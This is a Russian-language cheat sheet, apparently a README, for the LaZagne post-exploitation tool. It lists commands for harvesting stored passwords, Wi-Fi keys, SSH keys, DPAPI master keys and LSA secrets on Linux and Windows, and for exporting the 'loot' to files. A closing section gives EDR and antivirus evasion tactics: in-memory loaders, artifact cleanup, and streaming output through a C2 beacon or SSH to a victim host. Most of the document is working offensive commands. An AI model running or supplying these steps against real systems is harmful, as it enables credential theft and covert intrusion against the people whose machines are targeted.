<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Шпаргалка по Лазани

[LaZagne](https://github.com/AlessandroZ/LaZagne) — это приложение с открытым исходным кодом для постэксплуатационной обработки, используемое для извлечения паролей, хранящихся на локальном компьютере. Он поддерживает Windows, Linux и macOS в нескольких категориях, включая веб-браузеры, почтовые клиенты, сети Wi-Fi, программное обеспечение для управления базами данных, инструменты системного администратора и кэши памяти.

---

## Содержание

- [Поддерживаемые модули и категории](#supported-modules--categories)
- [Установка и двоичные файлы](#installation--binaries)
- [Сбор учетных данных Linux](#linux-credential-harvesting)
- [Сбор учетных данных Windows](#windows-credential-harvesting)
- [Атаки по целевой категории](#targeted-category-attacks)
- [Форматы вывода и экспорт файлов](#output-formats--file-export)
- [Эксплуатационная безопасность и предотвращение EDR](#operational-security--edr-avoidance)

---

## Поддерживаемые модули и категории

LaZagne извлекает учетные данные из десятков приложений, сгруппированных по категориям:
– **Браузеры:** Chrome, Firefox, Edge, Opera, Brave, Chromium (история, автозаполнение, файлы cookie, учетные данные).
- **Инструменты системного администратора:** WinSCP, PuTTY, OpenSSH (ключи/конфигурация `id_rsa`), RDP/mstsc, FileZilla, Cyberduck, VNC.
- **Базы данных:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** предварительные общие ключи WPA2/WPA3 (PSK) сохраняются в сетевых профилях ОС.
– **Разработчик и VCS:** учетные данные Git (`.git-credentials`, кеш), SVN, токены Docker, учетные данные AWS CLI.
- **Электронная почта и чат:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault и DPAPI:** секреты LSA, главные ключи DPAPI, элементы хранилища Credential Manager.

---

## Установка и двоичные файлы
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Сбор учетных данных Linux

### 1. Запустите все модули извлечения
```bash
python3 laZagne.py all
```
### 2. Запуск с правами root/Sudo (расширяет доступ к теням и связкам ключей)
Запуск от имени `root` разблокирует системные секреты, профили Wi-Fi в `/etc/NetworkManager` и ключи SSH во всех каталогах `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. Извлечение паролей из связки ключей Gnome / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Сбор учетных данных Windows

В Windows используйте автономный исполняемый файл `lazagne.exe`:

### 1. Извлеките все сохраненные пароли
```cmd
lazagne.exe all
```
### 2. Запуск с повышенными привилегиями (Администратор/СИСТЕМА)
Извлеките главные ключи DPAPI, секреты LSA и кэшированные учетные данные домена:
```cmd
lazagne.exe all -v
```
### 3. Извлечение паролей для конкретного пользователя (при работе от имени администратора)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Атаки по целевой категории

Вместо запуска всех модулей укажите целевые категории программного обеспечения, чтобы минимизировать активность диска и шум:

### 1. Только веб-браузеры
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Пароли Wi-Fi в виде открытого текста
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Инструменты системного администратора и удаленного доступа (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Клиенты баз данных
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Учетные данные разработчика и Git
```bash
# Linux
python3 laZagne.py git
```
---

## Форматы вывода и экспорт файлов

Сохраните собранные учетные данные непосредственно на диск в структурированных форматах:

### Экспорт в формат JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Создает `/tmp/loot_credentials.json`, содержащий структурированные учетные данные, URL-адреса, имена пользователей и пароли в виде открытого текста.

### Экспорт в обычный текст
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Создает `/tmp/loot_credentials.txt`.

---

## Операционная безопасность и предотвращение EDR

- **Обнаружение антивируса.** Автономный `lazagne.exe` тщательно подписан Защитником Windows и коммерческими решениями EDR.
- **Обфускация и выполнение в памяти:**
  - Выполнение через отражение PowerShell или загрузчики в памяти (`donut`, `execute-assembly` в Cobalt Strike/Sliver).
  — Используйте исходную версию Python с собственной виртуальной средой, а не упакованный двоичный файл PyInstaller.
- **Очистка артефактов.** Удалите временные файлы добычи или перенаправьте вывод напрямую через стандартный выход через зашифрованный маяк C2 или сеанс SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```